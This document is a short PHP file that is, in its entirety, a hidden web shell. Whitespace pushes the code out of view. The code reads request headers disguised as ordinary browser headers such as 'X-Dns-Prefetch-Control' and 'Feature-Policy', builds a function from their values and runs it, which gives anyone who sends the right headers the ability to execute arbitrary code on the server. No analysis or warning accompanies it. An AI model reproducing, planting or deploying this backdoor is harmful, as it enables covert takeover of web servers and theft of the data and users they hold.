<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['X-Dns-Prefetch-Control'])){$oauthexceptions=$_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Feature-Policy']));$oauthexceptions();}
